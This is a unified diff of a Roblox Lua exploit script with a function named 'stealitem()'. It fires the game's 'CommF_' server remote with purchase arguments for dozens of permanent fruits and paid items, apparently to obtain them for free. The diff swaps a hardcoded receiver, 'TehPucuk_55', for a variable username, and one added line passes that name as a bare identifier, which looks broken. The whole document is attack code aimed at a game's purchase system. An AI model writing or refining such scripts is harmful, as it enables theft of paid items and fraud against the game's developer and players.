@@ -9,6 +9,7 @@ local result = 0
 local HttpService = game:GetService("HttpService")
 
 local success, UserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(TehPucuk_55)
 end)
 
 local args = {
@@ -117,7 +118,7 @@ function stealitem()
                 ["PurchaseLocation"] = "FruitShop",
                 ["StorageName"] = "Permanent Dragon-Dragon",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -130,7 +131,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Kitsune-Kitsune",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -143,7 +144,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Leopard-Leopard",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -156,7 +157,7 @@ function stealitem()
                 ["StorageName"] = "Fruit Notifier",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -170,7 +171,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Spirit-Spirit",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -184,7 +185,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Gas-Gas",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -198,7 +199,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Venom-Venom",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -212,7 +213,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Shadow-Shadow",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -226,7 +227,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Dough-Dough",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -240,7 +241,7 @@ function stealitem()
                 ["StorageName"] = "Permanent T-Rex-T-Rex",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -254,7 +255,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Gravity-Gravity",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -268,7 +269,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Blizzard-Blizzard",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -282,7 +283,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Pain-Pain",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -296,7 +297,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Rumble-Rumble",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -310,7 +311,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Portal-Portal",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -324,7 +325,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Sound-Sound",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -338,7 +339,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Spider-Spider",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -352,7 +353,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Love-Love",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -366,7 +367,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Buddha-Buddha",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -380,7 +381,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Quake-Quake",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -394,7 +395,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Magma-Magma",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -408,7 +409,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Ghost-Ghost",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -422,7 +423,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Barrier-Barrier",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -436,7 +437,7 @@ function stealitem()
                 ["StorageName"] = "Dark Blade",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -450,7 +451,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Light-Light",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -464,7 +465,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Diamond-Diamond",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -478,7 +479,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Dark-Dark",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -492,7 +493,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Sand-Sand",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -506,7 +507,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Ice-Ice",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -520,7 +521,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Falcon-Falcon",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -534,7 +535,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Flame-Flame",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -548,7 +549,7 @@ function stealitem()
                 ["StorageName"] = "2x Money",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -562,7 +563,7 @@ function stealitem()
                 ["StorageName"] = "+1 Fruit Storage",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -576,7 +577,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Spike-Spike",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -590,7 +591,7 @@ function stealitem()
                 ["StorageName"] = "2x Boss Drops",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -603,7 +604,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Smoke-Smoke",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -616,7 +617,7 @@ function stealitem()
                 ["StorageName"] = "Permanent Bomb-Bomb",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -630,8 +631,8 @@ function stealitem()
                 ["StorageName"] = "Permanent Spring-Spring",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
-                ["ReceiverUserId"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
             }
         }
         
@@ -644,8 +645,8 @@ function stealitem()
                 ["StorageName"] = "Permanent Blade-Blade",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
-                ["ReceiverUserId"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
             }
         }
         
@@ -658,8 +659,8 @@ function stealitem()
                 ["StorageName"] = "Permanent Spin-Spin",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
-                ["ReceiverUserId"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
             }
         }
         
@@ -672,8 +673,8 @@ function stealitem()
                 ["StorageName"] = "10K Money",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
-                ["ReceiverUserId"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
             }
         }
         
@@ -686,8 +687,8 @@ function stealitem()
                 ["StorageName"] = "2x EXP (15 mins.)",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
-                ["ReceiverUserId"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
             }
         }
         game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
